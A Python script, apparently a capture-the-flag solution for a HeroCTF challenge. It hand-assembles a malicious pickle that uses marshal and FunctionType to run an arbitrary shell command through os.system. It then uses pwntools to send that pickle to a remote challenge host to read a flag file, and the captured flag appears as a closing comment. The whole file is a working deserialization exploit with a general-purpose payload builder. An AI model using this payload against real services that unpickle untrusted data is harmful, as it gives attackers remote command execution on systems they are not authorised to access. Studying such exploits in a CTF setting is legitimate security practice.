import marshal

from pwn import *


def create_payload(command):
    code = compile(f"__import__('os').system('{command}')", "<x>", "eval")
    marshaled = marshal.dumps(code)

    pkl = b"\x80\x04"
    pkl += b"("  # outer MARK - for final OBJ call
    pkl += b"("  # MARK for FunctionType
    pkl += b"ctypes\nFunctionType\n"
    pkl += b"("  # MARK for marshal.loads
    pkl += b"cmarshal\nloads\n"
    pkl += b"C" + bytes([len(marshaled)]) + marshaled
    pkl += b"o"  # OBJ -> code = marshal.loads(marshaled)
    pkl += b"}"  # empty dict for globals
    pkl += b"o"  # OBJ -> func = FunctionType(code, {})
    pkl += b"o"  # OBJ -> func() - executes the code!
    pkl += b"."  # STOP

    return pkl


def exploit(host="dyn15.heroctf.fr", port=11283):
    payload = create_payload("cat /app/flag.txt")

    io = remote(host, port)
    io.recvuntil(b": ")
    io.sendline(payload.hex().encode())

    result = io.recvall(timeout=5)
    print(result.decode())
    io.close()


if __name__ == "__main__":
    exploit()

# Hero{M4yb3_4b4nd0n1ng_p1ckl3_4ll_70g37h3r_w0uld_b3_4_g00d_1d34}
